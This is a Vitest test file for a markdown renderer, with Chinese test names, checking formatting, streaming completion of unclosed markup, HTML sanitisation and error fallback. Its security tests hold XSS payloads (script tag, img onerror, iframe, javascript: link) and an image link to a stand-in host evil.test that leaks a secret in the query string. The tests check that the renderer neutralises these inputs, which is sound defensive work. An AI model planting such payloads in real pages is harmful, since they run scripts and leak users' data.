// @vitest-environment jsdom
// DOMPurify 在 happy-dom 下会丢失元素和属性，消毒相关测试必须用 jsdom
import MarkdownIt from 'markdown-it'
import { afterEach, describe, expect, it, vi } from 'vitest'

import { renderMarkdown } from '@/shared/utils/markdown/render'

describe('renderMarkdown · 格式', () => {
  it('渲染加粗、列表和标题', () => {
    const html = renderMarkdown('### 年假\n- 满 1 年：**5 天**\n- 满 10 年：10 天')
    expect(html).toContain('<h3>年假</h3>')
    expect(html).toContain('<li>满 1 年：<strong>5 天</strong></li>')
    expect(html).not.toContain('**')
  })

  it('紧贴中文标点的加粗也能识别', () => {
    expect(renderMarkdown('**“年假”**为 5 天')).toContain('<strong>“年假”</strong>为')
  })

  it('单个换行保留为换行', () => {
    expect(renderMarkdown('第一行\n第二行')).toContain('第一行<br>')
  })
})

describe('renderMarkdown · 流式补全', () => {
  it('流式期间补全未闭合的加粗', () => {
    const html = renderMarkdown('年假为 **5 天', { streaming: true })
    expect(html).toContain('<strong>5 天</strong>')
    expect(html).not.toContain('**')
  })

  it('末尾刚出现的开标记不显示为裸符号', () => {
    expect(renderMarkdown('每年累计 **', { streaming: true })).not.toContain('*')
    expect(renderMarkdown('- 入职满 **1 年**不满 **', { streaming: true })).toContain(
      '<strong>1 年</strong>不满',
    )
  })

  it('末尾的闭标记被去掉后仍能正确补全', () => {
    expect(renderMarkdown('每年 **5 天**', { streaming: true })).toContain('<strong>5 天</strong>')
  })

  it('未闭合的代码块按代码块渲染', () => {
    expect(renderMarkdown('```\nconst a = 1', { streaming: true })).toContain('<pre><code>')
  })

  it('流式结束后不再改写原文', () => {
    expect(renderMarkdown('年假为 **5 天')).toContain('**5 天')
  })
})

describe('renderMarkdown · 安全', () => {
  it('HTML 标签按文本显示，不会生成元素', () => {
    const html = renderMarkdown(
      '<script>alert(1)</script><img src=x onerror=alert(1)><iframe src=x>',
    )
    expect(html).not.toMatch(/<(script|img|iframe)/)
  })

  it('危险协议的链接不可点击', () => {
    expect(renderMarkdown('[点我](javascript:alert(1))')).not.toContain('<a')
  })

  it('图片不渲染，防止通过 URL 外带数据', () => {
    expect(renderMarkdown('![x](http://evil.test/?d=secret)')).not.toContain('<img')
  })

  it('外链统一在新窗口打开并隔离来源', () => {
    const html = renderMarkdown('[文档](https://example.com)')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer nofollow"')
  })
})

describe('renderMarkdown · 降级', () => {
  afterEach(() => vi.restoreAllMocks())

  it('解析异常时退回转义后的纯文本', () => {
    vi.spyOn(MarkdownIt.prototype, 'render').mockImplementation(() => {
      throw new Error('boom')
    })
    expect(renderMarkdown('<b>a</b>\nb')).toBe('<p>&#60;b&#62;a&#60;/b&#62;<br>b</p>')
  })
})
